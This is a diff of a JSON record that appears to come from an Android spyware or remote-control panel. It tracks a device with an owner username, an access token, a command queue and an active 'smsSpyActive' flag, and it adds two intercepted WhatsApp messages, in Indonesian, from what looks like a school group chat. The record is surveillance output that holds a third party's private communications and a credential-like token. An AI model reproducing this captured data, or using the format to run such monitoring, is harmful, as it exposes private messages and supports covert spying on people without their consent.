@@ -4,7 +4,7 @@
     "deviceName": "HP-SANGEAN-6B64",
     "ownerUsername": "KUDANIL",
     "token": "3020da2f0f6d9f81513d32cd8944bd59",
-    "lastSeen": 1775222932011,
+    "lastSeen": 1775222944408,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-02T14:28:53.779Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "prakarya kmpk 5",
+        "content": "‎2 pesan baru",
+        "time": "03/04 20:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775222947039
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎prakarya kmpk 5 (2 pesan): ~ nur",
+        "content": "berarti bsk kan",
+        "time": "03/04 20:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775222946956
+      },
       {
         "appName": "WhatsApp",
         "sender": "prakarya kmpk 5: ~ nur",
